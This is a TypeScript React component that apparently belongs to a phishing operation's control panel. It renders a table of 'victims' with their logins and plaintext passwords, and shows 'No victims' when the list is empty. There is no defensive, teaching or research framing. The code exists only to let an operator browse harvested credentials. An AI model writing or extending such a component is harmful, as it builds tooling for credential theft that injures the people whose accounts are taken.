type Victim = {
  _id: string;
  login: string;
  password: string;
};
type VictimsProps = {
  victims: Victim[];
};

function Victims({ victims }: Readonly<VictimsProps>) {
  return (
    <table className="w-full border-collapse border border-black/20 dark:border-white/20 text-start">
      <thead>
        <tr className="bg-zinc-100 dark:bg-zinc-800 p-4 ">
          <th className="text-start p-2">login</th>
          <th className="text-start p-2">password</th>
        </tr>
      </thead>
      <tbody>
        {victims.length > 0 ? (
          victims.map((victim, index) => (
            <tr
              key={victim._id}
              className={`${
                index % 2 === 0
                  ? "bg-zinc-100 dark:bg-zinc-800"
                  : "bg-zinc-200 dark:bg-zinc-700"
              } border-b border-black/20 dark:border-white/20`}
            >
              <td className="p-2">{victim.login}</td>
              <td className="p-2">{victim.password}</td>
            </tr>
          ))
        ) : (
          <tr>
            <td colSpan={3} className="p-2">
              No victims
            </td>
          </tr>
        )}
      </tbody>
    </table>
  );
}

export default Victims;
